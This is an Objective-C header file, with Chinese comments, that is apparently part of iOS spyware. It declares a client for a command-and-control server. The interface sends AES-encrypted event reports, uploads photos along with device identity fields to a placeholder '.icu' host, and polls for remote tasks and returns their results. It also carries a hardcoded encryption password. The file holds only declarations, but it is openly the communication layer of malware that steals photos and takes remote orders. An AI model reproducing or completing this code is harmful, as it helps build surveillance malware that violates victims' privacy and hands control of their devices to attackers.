//
//  Net.h — 和 C2 服务端通信
//
//  两条通道，和服务器 ingest 完全对齐：
//    · /event  ：加密 JSON（x-ts + AES-256-ECB），响应里带 tasks
//    · /t      ：multipart/form-data 上传照片，字段 u/d/s/lhu/m/b/ts + file
//    · /taskget /taskresult：任务轮询与回执
//
#import <Foundation/Foundation.h>

@interface Net : NSObject

@property (nonatomic, copy) NSString *baseURL;      // https://xxx.icu
@property (nonatomic, copy) NSString *aesPassword;  // Ek8pl31K2yeHgQwy
@property (nonatomic, strong) NSDictionary *identity; // u/d/s/lhu/m/b 等

+ (instancetype)shared;

/// 发一个「加密 JSON」请求，返回解析后的字典（响应可能是明文也可能是加密的）
- (NSDictionary *)postEncrypted:(NSString *)path
                           json:(NSDictionary *)json
                        timeout:(NSTimeInterval)timeout;

/// 上传一张照片（multipart，JPEG 原图即可，服务端会 sniff 出图片格式）
- (BOOL)uploadPhoto:(NSData *)jpeg
                idx:(NSInteger)idx
                rid:(NSString *)rid
             fields:(NSDictionary *)extraFields;

/// 上报一个事件（/event），返回字典（里面可能有 tasks）
- (NSDictionary *)sendEvent:(NSDictionary *)event;

@end
